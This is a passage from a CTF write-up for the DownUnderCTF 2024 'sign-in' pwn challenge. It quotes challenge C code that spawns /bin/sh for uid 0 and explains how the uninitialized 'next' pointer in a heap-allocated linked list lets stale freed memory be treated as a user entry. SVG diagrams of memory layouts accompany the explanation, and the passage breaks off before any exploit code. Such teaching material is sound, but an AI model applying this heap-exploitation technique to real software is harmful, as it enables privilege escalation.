<span class="w">    </span><span class="n">user_list</span><span class="p">.</span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">root</span><span class="p">;</span>

<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">choice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">menu</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">sign_up</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sign_in</span><span class="p">();</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">uid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Invalid username or password!&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">uid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Please sign in first!&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">remove_account</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
<span class="w">                </span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">uid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Please sign in as root first!&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
</details>
<ul>
<li><a href="https://github.com/DownUnderCTF/Challenges_2024_Public/blob/f2797a33d8f5851508f37e854afceedf85eee8a3/pwn/sign-in/src/sign-in">sign-in binary</a></li>
</ul>
<p>NB:</p>
<ul>
<li>
<p>Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by <strong>number</strong>, 0-based index implied. </p>
<p>Ie, element <code>0</code> of list <code>[1, 2, 4, 8, 16]</code> is <code>1</code>, Element <code>3</code> is <code>8</code>.</p>
<p>When element is reference in explanation with <strong>word</strong> (first, third...), 1-based system is implied.</p>
<p>Ie, first character of string <code>Hello World!</code> is <code>H</code>, fifth is <code>o</code>.</p>
</li>
</ul>
<ul>
<li>Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure.</li>
</ul>
<ul>
<li>I am using gdb with <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> plugin</li>
</ul>
<h2 id="my-struggle">My struggle<a class="headerlink" href="#my-struggle" title="Permanent link">&para;</a></h2>
<h3 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h3>
<p><code>user_entry</code> structure is a typical implementation of doubly linked list (<a href="https://en.wikipedia.org/wiki/Doubly_linked_list">wiki</a>).</p>
<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">user_entry</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">user_t</span><span class="o">*</span><span class="w"> </span><span class="n">user</span><span class="p">;</span>
<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">prev</span><span class="p">;</span>
<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">next</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></td></tr></table></div>
<p>Example of memory layout of 3 user_entries (0x100000, 0x100040, 0x100080) with 3 user accounts (0x100020, 0x100060, 0x1000a0 (root, bob and alice)):</p>
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
 "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!-- Generated by graphviz version 9.0.0 (20230911.1827)
 -->
<!-- Title: g Pages: 1 -->
<div><svg width="735pt" height="341pt"
 viewBox="0.00 0.00 735.00 341.25" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="graph0" class="graph" transform="scale(1 1) rotate(0) translate(4 337.25)">
<title>g</title>
<polygon fill="white" stroke="none" points="-4,4 -4,-337.25 731,-337.25 731,4 -4,4"/>
<text text-anchor="middle" x="363.5" y="-7.95" font-family="Helvetica,Arial,sans-serif" font-size="14.00">figure 1. Sample memory layout</text>
<!-- element0 -->
<g id="node1" class="node">
<title>element0</title>
<polygon fill="#88ff00" fill-opacity="0.133333" stroke="none" points="160,-290.25 0,-290.25 0,-193.25 160,-193.25 160,-290.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-266 0,-290.25 160,-290.25 160,-266 0,-266"/>
<text text-anchor="start" x="5" y="-274.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="8.75" y="-274.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user_entry 0x100000 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-241.75 0,-266 160,-266 160,-241.75 0,-241.75"/>
<text text-anchor="start" x="5" y="-249.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> user: 0x100020 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-217.5 0,-241.75 160,-241.75 160,-217.5 0,-217.5"/>
<text text-anchor="start" x="5" y="-225.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> prev: null </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-193.25 0,-217.5 160,-217.5 160,-193.25 0,-193.25"/>
<text text-anchor="start" x="5" y="-201.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> next: 0x100040 </text>
</g>
<!-- element1 -->
<g id="node2" class="node">
<title>element1</title>
<polygon fill="#88ff00" fill-opacity="0.133333" stroke="none" points="356,-218.25 196,-218.25 196,-121.25 356,-121.25 356,-218.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-194 196,-218.25 356,-218.25 356,-194 196,-194"/>
<text text-anchor="start" x="201" y="-202.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="204.75" y="-202.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user_entry 0x100040 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-169.75 196,-194 356,-194 356,-169.75 196,-169.75"/>
<text text-anchor="start" x="201" y="-177.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> user: 0x100060 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-145.5 196,-169.75 356,-169.75 356,-145.5 196,-145.5"/>
<text text-anchor="start" x="201" y="-153.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> prev: 0x100000 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="196,-121.25 196,-145.5 356,-145.5 356,-121.25 196,-121.25"/>
<text text-anchor="start" x="201" y="-129.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> next: 0x10080 </text>
</g>
<!-- element0&#45;&gt;element1 -->
<g id="edge1" class="edge">
<title>element0:next&#45;&gt;element1:head</title>
<path fill="none" stroke="black" d="M160,-205.75C171.38,-205.75 176.68,-205.75 184.55,-205.75"/>
<polygon fill="black" stroke="black" points="184.49,-209.25 194.49,-205.75 184.49,-202.25 184.49,-209.25"/>
</g>
<!-- user0 -->
<g id="node4" class="node">
<title>user0</title>
<polygon fill="#0044ff" fill-opacity="0.133333" stroke="none" points="335,-333.25 217,-333.25 217,-236.25 335,-236.25 335,-333.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-309 217,-333.25 335,-333.25 335,-309 217,-309"/>
<text text-anchor="start" x="222" y="-317.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="225.75" y="-317.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user 0x100020 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-284.75 217,-309 335,-309 335,-284.75 217,-284.75"/>
<text text-anchor="start" x="222" y="-292.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> id: 0 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-260.5 217,-284.75 335,-284.75 335,-260.5 217,-260.5"/>
<text text-anchor="start" x="222" y="-268.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> username: root </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="217,-236.25 217,-260.5 335,-260.5 335,-236.25 217,-236.25"/>
<text text-anchor="start" x="222" y="-244.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00">password: ???? </text>
</g>
<!-- element0&#45;&gt;user0 -->
<g id="edge5" class="edge">
<title>element0:user&#45;&gt;user0:head</title>
<path fill="none" stroke="black" d="M160,-253.75C194.41,-253.75 181.31,-306.43 204.96,-318.37"/>
<polygon fill="black" stroke="black" points="204.01,-321.74 214.52,-320.43 205.49,-314.9 204.01,-321.74"/>
</g>
<!-- element1&#45;&gt;element0 -->
<g id="edge2" class="edge">
<title>element1:prev&#45;&gt;element0:head</title>
<path fill="none" stroke="black" d="M196,-157.75C144.89,-157.75 204.2,-258.87 171.2,-275.46"/>
<polygon fill="black" stroke="black" points="170.58,-272.01 161.48,-277.45 171.98,-278.87 170.58,-272.01"/>
</g>
<!-- element2 -->
<g id="node3" class="node">
<title>element2</title>
<polygon fill="#88ff00" fill-opacity="0.133333" stroke="none" points="552,-146.25 392,-146.25 392,-49.25 552,-49.25 552,-146.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-122 392,-146.25 552,-146.25 552,-122 392,-122"/>
<text text-anchor="start" x="397" y="-130.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="400.75" y="-130.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user_entry 0x100080 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-97.75 392,-122 552,-122 552,-97.75 392,-97.75"/>
<text text-anchor="start" x="397" y="-105.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> user: 0x1000a0 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-73.5 392,-97.75 552,-97.75 552,-73.5 392,-73.5"/>
<text text-anchor="start" x="397" y="-81.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> prev: 0x100040 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="392,-49.25 392,-73.5 552,-73.5 552,-49.25 392,-49.25"/>
<text text-anchor="start" x="397" y="-57.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> next: null </text>
</g>
<!-- element1&#45;&gt;element2 -->
<g id="edge3" class="edge">
<title>element1:next&#45;&gt;element2:head</title>
<path fill="none" stroke="black" d="M356,-133.75C367.38,-133.75 372.68,-133.75 380.55,-133.75"/>
<polygon fill="black" stroke="black" points="380.49,-137.25 390.49,-133.75 380.49,-130.25 380.49,-137.25"/>
</g>
<!-- user1 -->
<g id="node5" class="node">
<title>user1</title>
<polygon fill="#0044ff" fill-opacity="0.133333" stroke="none" points="544.5,-261.25 399.5,-261.25 399.5,-164.25 544.5,-164.25 544.5,-261.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="399.5,-237 399.5,-261.25 544.5,-261.25 544.5,-237 399.5,-237"/>
<text text-anchor="start" x="418" y="-245.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="421.75" y="-245.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user 0x100060 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="399.5,-212.75 399.5,-237 544.5,-237 544.5,-212.75 399.5,-212.75"/>
<text text-anchor="start" x="404.5" y="-220.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> id: 1 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="399.5,-188.5 399.5,-212.75 544.5,-212.75 544.5,-188.5 399.5,-188.5"/>
<text text-anchor="start" x="404.5" y="-196.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> username: bob </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="399.5,-164.25 399.5,-188.5 544.5,-188.5 544.5,-164.25 399.5,-164.25"/>
<text text-anchor="start" x="404.5" y="-172.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> password: password1 </text>
</g>
<!-- element1&#45;&gt;user1 -->
<g id="edge6" class="edge">
<title>element1:user&#45;&gt;user1:head</title>
<path fill="none" stroke="black" d="M356,-181.75C386.48,-181.75 369.25,-232.13 387.06,-245.52"/>
<polygon fill="black" stroke="black" points="385.97,-248.85 396.55,-248.32 387.95,-242.13 385.97,-248.85"/>
</g>
<!-- element2&#45;&gt;element1 -->
<g id="edge4" class="edge">
<title>element2:prev&#45;&gt;element1:head</title>
<path fill="none" stroke="black" d="M392,-85.75C340.89,-85.75 400.2,-186.87 367.2,-203.46"/>
<polygon fill="black" stroke="black" points="366.58,-200.01 357.48,-205.45 367.98,-206.87 366.58,-200.01"/>
</g>
<!-- user2 -->
<g id="node6" class="node">
<title>user2</title>
<polygon fill="#0044ff" fill-opacity="0.133333" stroke="none" points="727,-122.25 588,-122.25 588,-25.25 727,-25.25 727,-122.25"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="588,-98 588,-122.25 727,-122.25 727,-98 588,-98"/>
<text text-anchor="start" x="603.5" y="-106.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="607.25" y="-106.85" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user 0x1000a0 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="588,-73.75 588,-98 727,-98 727,-73.75 588,-73.75"/>
<text text-anchor="start" x="593" y="-81.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> id: 2 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="588,-49.5 588,-73.75 727,-73.75 727,-49.5 588,-49.5"/>
<text text-anchor="start" x="593" y="-57.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> username: alice </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="588,-25.25 588,-49.5 727,-49.5 727,-25.25 588,-25.25"/>
<text text-anchor="start" x="593" y="-33.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> password: pasword2 </text>
</g>
<!-- element2&#45;&gt;user2 -->
<g id="edge7" class="edge">
<title>element2:user&#45;&gt;user2:head</title>
<path fill="none" stroke="black" d="M552,-109.75C563.38,-109.75 568.68,-109.75 576.55,-109.75"/>
<polygon fill="black" stroke="black" points="576.49,-113.25 586.49,-109.75 576.49,-106.25 576.49,-113.25"/>
</g>
</g>
</svg></div>

<p>New entries created during signup:</p>
<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">sign_up</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">user_t</span><span class="o">*</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">user_t</span><span class="p">));</span>
<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">user_entry_t</span><span class="p">));</span><span class="w">  </span><span class="err">#</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">allocate</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">user_entry</span>
<span class="w">    </span><span class="n">user</span><span class="o">-&gt;</span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UID</span><span class="o">++</span><span class="p">;</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;username: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;password: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">user</span><span class="p">;</span><span class="w">                                  </span><span class="err">#</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="err">&#39;</span><span class="n">user</span><span class="err">&#39;</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">entry</span>

<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">user_list</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="p">;</span><span class="w">                                  </span><span class="err">#</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="err">&#39;</span><span class="n">prev</span><span class="err">&#39;</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">entry</span><span class="w">  </span>
<span class="w">    </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">entry</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p><code>sign_up</code> function sets values for <code>user</code> and <code>prev</code> fields, but it doesn't initialize value of <code>next</code> field. According to language specification,
value of the uninitialized variable is undeterminate. In practice, it will be the value that was in the RAM before allocation.
This value will be interpreted as address of the next entry in the list.</p>
<p>List traversal of the <code>sign_in</code> function will go to this "undeterminate" address and interpret that memory as <code>user_entry</code> structure.</p>
<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kt">long</span><span class="w"> </span><span class="nf">sign_in</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">password</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;username: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;password: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="n">user_entry_t</span><span class="o">*</span><span class="w"> </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">user_list</span><span class="p">;</span><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">curr</span><span class="w"> </span><span class="n">variable</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">head</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">list</span><span class="w"> </span>
<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="w">                                        </span><span class="cp"># read username and password from curr entry </span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">memcmp</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Logging in as %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">curr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span><span class="w">              </span><span class="err">#</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">curr</span><span class="w"> </span><span class="n">variable</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">next</span><span class="w"> </span><span class="n">entry</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="n">curr</span><span class="p">);</span><span class="w">                      </span><span class="err">#</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">uninitialized</span><span class="w"> </span><span class="n">memory</span><span class="o">:</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">null</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="n">iteration</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p>When we delete user, memory would look like:</p>
<ul>
<li>2 user_entries with addresses 0x100000, 0x100040</li>
<li>2 user accounts with addresses 0x100020, 0x100060 (root, bob)</li>
<li>two recycled memory blocks that will be available for view allocations: 0x100080, 0x1000a0</li>
</ul>
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
 "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!-- Generated by graphviz version 9.0.0 (20230911.1827)
 -->
<!-- Title: g Pages: 1 -->
<div><svg width="545pt" height="244pt"
 viewBox="0.00 0.00 545.00 244.00" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="graph0" class="graph" transform="scale(1 1) rotate(0) translate(4 240)">
<title>g</title>
<polygon fill="white" stroke="none" points="-4,4 -4,-240 541,-240 541,4 -4,4"/>
<!-- element0 -->
<g id="node1" class="node">
<title>element0</title>
<polygon fill="#88ff00" fill-opacity="0.133333" stroke="none" points="160,-193 0,-193 0,-96 160,-96 160,-193"/>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-168.75 0,-193 160,-193 160,-168.75 0,-168.75"/>
<text text-anchor="start" x="5" y="-177.6" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> </text>
<text text-anchor="start" x="8.75" y="-177.6" font-family="Helvetica,Arial,sans-serif" font-weight="bold" font-size="12.00">user_entry 0x100000 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-144.5 0,-168.75 160,-168.75 160,-144.5 0,-144.5"/>
<text text-anchor="start" x="5" y="-152.35" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> user: 0x100020 </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-120.25 0,-144.5 160,-144.5 160,-120.25 0,-120.25"/>
<text text-anchor="start" x="5" y="-128.1" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> prev: null </text>
<polygon fill="none" stroke="#000000" stroke-opacity="0.266667" points="0,-96 0,-120.25 160,-120.25 160,-96 0,-96"/>
<text text-anchor="start" x="5" y="-103.85" font-family="Helvetica,Arial,sans-serif" font-size="12.00"> next: 0x100040 </text>
</g>
<!-- element1 -->
<g id="node2" class="node">
<title>element1</title>
<polygon fill="#88ff00" fill-opacity="0.133333" stroke="none" points="356,-121 196,-121 196,-24 356,-24 356,-121"/>
